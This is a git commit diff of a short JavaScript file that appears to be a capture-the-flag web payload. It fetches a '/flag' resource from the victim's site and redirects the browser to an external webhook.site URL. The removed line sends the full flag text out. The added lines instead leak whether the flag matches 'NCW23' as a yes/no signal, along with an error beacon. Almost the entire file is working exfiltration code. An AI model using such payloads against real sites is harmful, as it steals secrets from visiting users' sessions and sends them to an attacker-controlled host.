4d7cedf4661584dd0d0d3f0a9e33f3fb801e8d95
Emyr298 <emi.ru298@gmail.com>
2023-12-03 10:13:27 +0700

    s

--- test5.js
+++ test5.js
@@ -1,6 +1,10 @@
 fetch('/flag').then((res) => {
     res.text().then((test) => {
-        window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/${test}`;
+        if (test.match(/NCW23/)) {
+            window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/yes`;
+        } else {
+            window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/no`;
+        }
     }).catch((owo) => {
         window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/error2`;
     })
